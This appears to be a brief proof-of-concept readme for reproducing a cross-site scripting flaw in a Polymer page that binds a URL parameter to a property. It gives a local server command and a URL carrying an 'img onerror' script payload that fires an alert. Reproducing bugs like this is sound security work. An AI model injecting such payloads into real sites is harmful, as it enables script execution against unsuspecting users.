Polymer XSS Reproduction PoC

This page captures data from the 'p' URL parameter and binds it to a Polymer property.

Instructions:

To trigger the XSS, start a python server in C:\polymer\:

python -m http.server 8081

Then navigate to:

http://localhost:8081/poc/xss-demo.html?p=<img src=x onerror=alert('XSS_SUCCESS_IN_POC')>
